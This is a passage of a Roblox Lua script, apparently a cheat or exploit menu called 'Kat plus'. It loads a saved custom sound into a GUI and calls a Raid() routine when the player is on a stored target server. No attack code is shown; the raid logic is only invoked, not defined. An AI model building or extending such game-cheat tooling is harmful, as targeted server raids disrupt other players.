Template7Color = Rarities[ReturnData("CustomSound/SoundRarity.txt")]
Template7.ItemIcon.ImageColor3 = Template7Color
Template7.BorderColor3 = Template7Color
Template7.ItemName.TextColor3 = Template7Color
Template7.ItemName.Text = ReturnData("CustomSound/SoundName.txt")
Template7.ItemIcon.Image = "rbxassetid://17698072241"
end

Template7Button.MouseButton1Click:Connect(function()
	if ReturnData("CustomSound/SoundId.txt") ~= nil then
		TextBox.Text = ReturnData("CustomSound/SoundId.txt")
		TextBox2.Text = ReturnData("CustomSound/SoundVolume.txt")
	else
	TextBox.Text = ""
	TextBox2.Text = ""
	Info.Confirm.Label.Text = "Add"
	Notify("Fill out the above to add a custom sound that will always show up",8,1)
	end
end)

if ReturnData("TargetServer.JobId") == tostring(game.JobId) then
	Raid()
	else
		ChangeData("TargetServer.JobId","None")
end

ColoredPrint("Kat plus has loaded successfully",Color3.fromRGB(0,200,125),{"success",true})